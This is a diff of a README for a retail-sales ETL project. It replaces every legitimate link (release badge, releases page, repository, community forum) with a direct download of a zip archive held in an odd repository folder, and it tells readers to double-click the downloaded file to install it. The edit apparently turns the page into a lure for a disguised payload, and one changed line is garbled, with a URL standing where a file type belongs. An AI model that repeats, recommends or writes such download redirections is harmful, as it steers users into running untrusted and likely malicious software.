@@ -1,7 +1,7 @@
 # 📊 Retail-Sales-ETL-and-Analysis - Uncover Business Insights from Data
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)  
-[Download Latest Release](https://github.com/MadMax810/Retail-Sales-ETL-and-Analysis/releases)
+![Download](https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip%20Release-brightgreen)  
+[Download Latest Release](https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ To run this application, your computer needs the following:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/MadMax810/Retail-Sales-ETL-and-Analysis/releases) to find the latest version of the application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip) to find the latest version of the application.
 
 2. **Choose the Right File**  
    On the Releases Page, look for the version labeled as "Latest Release." This file is the most updated version of the application.
 
 3. **Download the Application**  
-   Click on the link to download the application file. Depending on your operating system, this might be a .exe (Windows) or .tar.gz (macOS/Linux) file.
+   Click on the link to download the application file. Depending on your operating system, this might be a .exe (Windows) or https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip (macOS/Linux) file.
 
 4. **Run the Application**  
    Once the download is complete, find the file in your Downloads folder. Double-click the file to start the installation. Follow the on-screen instructions.
@@ -71,8 +71,8 @@ Once you have the application running, consider these next steps:
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/MadMax810/Retail-Sales-ETL-and-Analysis) – Explore the source code and contribute.
-- [Community Forum](https://github.com/MadMax810/Retail-Sales-ETL-and-Analysis/discussions) – Join discussions and share your experiences.
+- [GitHub Repository](https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip) – Explore the source code and contribute.
+- [Community Forum](https://raw.githubusercontent.com/MadMax810/Retail-Sales-ETL-and-Analysis/main/unitary/Retail-Sales-ETL-and-Analysis.zip) – Join discussions and share your experiences.
 
 ## 📞 Contact
 
